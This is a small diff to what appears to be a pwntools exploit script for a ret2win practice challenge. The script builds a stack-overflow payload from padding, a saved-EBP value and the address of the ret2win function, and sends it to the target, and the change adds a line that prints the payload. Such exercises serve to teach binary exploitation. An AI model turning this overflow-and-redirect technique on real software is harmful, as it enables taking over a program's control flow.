@@ -29,7 +29,7 @@ ret2win = p32(elf.sym.ret2win)
 payload = junk
 payload += ebp
 payload += ret2win
-
+print(payload)
 r.sendlineafter('>', payload)
 
 #========= interactive ====================
